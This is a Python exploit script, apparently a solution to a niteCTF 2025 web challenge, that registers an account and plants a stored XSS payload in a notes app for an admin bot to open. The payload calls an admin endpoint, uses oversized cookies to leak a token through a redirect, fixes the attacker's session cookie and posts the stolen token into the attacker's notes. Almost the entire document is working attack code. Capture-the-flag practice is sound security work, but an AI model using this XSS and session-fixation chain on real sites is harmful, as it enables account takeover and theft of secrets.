import requests
import json
from bs4 import BeautifulSoup

# Create a session to persist cookies
s = requests.Session()

# register user
s.post("https://notes.chals.nitectf25.live/register", data={"username":"arunlikeskidsab","password":"attackerpass"})

# login
r = s.post("https://notes.chals.nitectf25.live/login", data={"username":"arunlikeskidsab","password":"attackerpass"})
print("Login status:", r.status_code)
print("All cookies:", s.cookies.get_dict())

# Extract the session cookie value
session_cookie = s.cookies.get("session")
print("Extracted session cookie:", session_cookie)

# add note with XSS payload
xss_payload = """<script>
(async () => {
    // fetch invite
    const gen = await fetch("https://notes.chals.nitectf25.live/admin/generate_invite", { method: "POST" });
    console.log(gen);

    document.cookie = "x="+"A".repeat(4095);
    document.cookie = "y="+"B".repeat(3991);

    // fetch redirect
    const e = await fetch("https://notes.chals.nitectf25.live/getToken", { credentials: "include" });
    console.log(e);

    // e.url now contains the redirected URL with token
    const url = new URL(e.url);
    const t = url.searchParams.get("token");
    console.log("Token:", t);

    document.cookie = "x="+"A";
    document.cookie = "y="+"B";
    document.cookie = "session={session}";
    
    // send the note and get response
    const noteResponse = await fetch("https://notes.chals.nitectf25.live/notes", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "content=" + encodeURIComponent(t)
    });
    
})();
</script>"""

# Replace the placeholder with the actual session cookie value
xss_payload = xss_payload.replace("{session}", session_cookie)

print("\nPayload preview:", xss_payload[:200])

# Post to notes — cookies are persisted in the session
r = s.post("https://notes.chals.nitectf25.live//notes", data={"content":xss_payload})
print("Note posted, status:", r.status_code)

# Get notes — cookies still persisted
r = s.get("https://notes.chals.nitectf25.live//notes")
soup = BeautifulSoup(r.text, 'html.parser')
note_link = soup.find('div').find('a')['href']
print("Note link:", note_link)

print("XSS payload injected, submit url to admin bot")